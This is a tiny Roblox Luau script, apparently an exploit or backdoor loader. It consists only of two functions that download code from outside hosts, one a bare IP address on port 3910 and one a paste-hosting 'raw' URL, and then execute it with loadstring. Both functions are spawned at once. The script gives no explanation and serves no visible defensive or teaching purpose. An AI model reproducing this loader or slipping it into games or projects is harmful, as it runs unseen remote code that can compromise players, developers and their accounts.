local function a()
    ID="123123";
    loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
end

local function d()
    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/xhqLmKmNElGIUkIV/raw"))()
end

task.spawn(a)
task.spawn(d)
